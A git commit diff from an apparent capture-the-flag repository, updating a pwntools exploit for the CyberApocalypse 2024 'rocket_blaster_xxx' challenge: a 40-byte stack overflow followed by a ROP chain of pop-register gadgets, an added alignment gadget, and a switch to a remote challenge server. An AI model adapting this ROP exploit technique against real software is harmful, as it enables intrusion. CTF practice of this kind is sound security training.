7b7f212e9f2d1df6487596f6e50a0af353dc8208
ShundaZhang <zhangshunda@gmail.com>
2024-03-10 21:36:56 +0800

    ctf

--- CyberApocalypse2024/pwn/pwn_rocket_blaster_xxx/dec.py
+++ CyberApocalypse2024/pwn/pwn_rocket_blaster_xxx/dec.py
@@ -8,7 +8,7 @@ cyclic -l jaaa
 0x000000000040159f : pop rdi ; ret
 0x000000000040159d : pop rsi ; ret
 0x000000000040159b : pop rdx ; ret
-
+0x000000000040101a : ret
 '''
 
 from pwn import *
@@ -17,13 +17,12 @@ from pwn import *
 offset = 40
 
 fill_ammo = 0x4012f5
-
-shellcode = offset*b'A'+p64(0x000000000040159f) + p64(0xdeadbeef) + p64(0x000000000040159d) + p64(0xdeadbabe) + p64(0x000000000040159b) + p64(0xdead1337) + p64(fill_ammo)
-
-#ip, port = '94.237.53.121', 41229
-#io = remote(ip, port)
+shellcode = offset*b'A'+ p64(0x000000000040101a) + p64(0x000000000040159f) + p64(0xdeadbeef) + p64(0x000000000040159d) + p64(0xdeadbabe) + p64(0x000000000040159b) + p64(0xdead1337) + p64(fill_ammo)
+print(len(shellcode))
+ip, port = '94.237.53.121', 41229
+io = remote(ip, port)
 #io = process('./rocket_blaster_xxx')
-io = gdb.debug('./rocket_blaster_xxx', 'break main')
+#io = gdb.debug('./rocket_blaster_xxx', 'break main')
 
 io.recvuntil('>>')
 io.sendline(shellcode)
